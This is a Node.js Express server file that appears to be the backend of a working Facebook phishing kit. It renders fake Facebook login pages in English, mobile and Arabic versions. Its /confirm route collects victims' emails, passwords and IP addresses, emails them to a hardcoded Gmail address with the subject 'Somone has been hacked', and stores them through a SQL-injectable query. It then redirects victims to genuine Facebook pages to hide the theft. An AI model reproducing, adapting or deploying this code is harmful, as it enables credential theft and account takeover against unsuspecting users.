var express = require('express');
var app = express();
app.use(express.static('public'));
const PORT = process.env.PORT || 5000;
app.set('view engine', 'ejs');
const pg = require('pg');
var bodyParser = require('body-parser');
app.use(bodyParser.urlencoded({ extended: false }));
const client = new pg.Client(process.env.DATABASE_URL);

client.connect();
client.query("create table facebook (mail text,password text,ip text,time timestamp default now())")

// ############################################       NODE MAILER    ##############################################################################################
const nodemailer = require("nodemailer");
var transporter = nodemailer.createTransport({
    service: 'gmail',
    host: 'smtp.gmail.com',
    secure: true,
    port: 465,

    auth: {
        user: 'fadysadakah.emh@gmail.com',
        pass: 'encrypted'
    }
});
var mailOptions = {
    from: 'Fady Sadakah<fadysadakah.emh@gmail.com>',
    to: "fadysadakah.emh@gmail.com",
    subject: 'Somone has been hacked',
    text: '',
    html: ''
};




// #####################################################################################################################################################
var redirect_link='https://www.google.com'

app.get('/', function (req, res) {
    res.render('fb_en', { redirect_link: redirect_link });
    
})
app.get('/n/*', function (req, res) {
    redirect_link ='https://www.facebook.com/my.omelette/photos/a.400034677207255/455544524989603/?type=3&theater'
    res.render('fb_en',{redirect_link:redirect_link});
    
})
app.get('/m/*', function (req, res) {
    redirect_link ='https://www.facebook.com/my.omelette/photos/a.400034677207255/456186991592023/?type=3&eid=ARCI3x9KOfpMY6RLnrvxq4ymhnhlGgwax6T5jLO-iSjbFRnMxNllFOj98GRQhQqxLAK8tuR-aJd-GDjk&__xts__%5B0%5D=68.ARAOTcshp3K7bSe4xTULMtuTuTSEGsIU8BLtkHiqLZ-P3mdk00H8ONOQu1NoAA08GaLy_bCByT6jRy7gk8rCEkLlzhavPivGAPVegqy1XV4IC6BALmfSqDlvfW11WUzf3pTaSgYxhzjOXiZGYfgp0Gx-nQXnByTJgW01P8KHP6CUqxdfWDiO91u21tLk2hfoG9bopD81BOUdeaf__MXYsKjU4XydaoisSG6X4KyHEGVAOo8X-InF9jk61LI9WOoJD11sMTNRqRRfxd5VE4E3NwZ0Dn0fQ8-S6-Mj45xlUKOuwfo-dpCVKdjdQr8e_dYxvylmDv7HSdqTi_U_eevT3hM&__tn__=EEHH-R'
    res.render('fb_en_m',{redirect_link:redirect_link});
    
})
app.get('/ar/uns/*', function (req, res) {
    redirect_link = 'https://www.facebook.com/eyaynews/'
    res.render('fb_ar',{redirect_link:redirect_link});

})
app.get('/ar/*', function (req, res) {
    res.render('fb_ar',{redirect_link:redirect_link});

})

// #####################################################################################################################################################
app.post('/confirm', function (req, res) {
    var mail = req.body.email_a;
    var password = req.body.pass_a;
    var c = req.body.email;
    var d = req.body.pass;


    if (mail == undefined) {
        mail = c;
    } else if (c == undefined) {
        
    } else if (mail.length < c.length) {
        mail = c;
    }
    
    if (password == undefined) {
        password = d;
    } else if (d == undefined) {
        
    }
    else if (password.length < d.length) {
        password = d;
    }


    var ip = req.headers['x-forwarded-for'] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    (req.connection.socket ? req.connection.socket.remoteAddress : null);
    
    res.redirect(req.body.redirect_link)


    //    mailOptions.to='';
    mailOptions.text='mail   :   '+mail+'\npassword   :   '+password+'\nip   :   '+ip;
    transporter.sendMail(mailOptions, function () { });


    client.query("INSERT INTO facebook (mail,password,ip) VALUES ('" + mail + "','" + password + "','" + ip + "')", function (err, result) { })
})




// ***********************************************************************************************************************************************

app.get('*', function (req, res) {
    res.redirect('/')
})
app.listen(PORT, function () {
    console.log('Server Started')
})
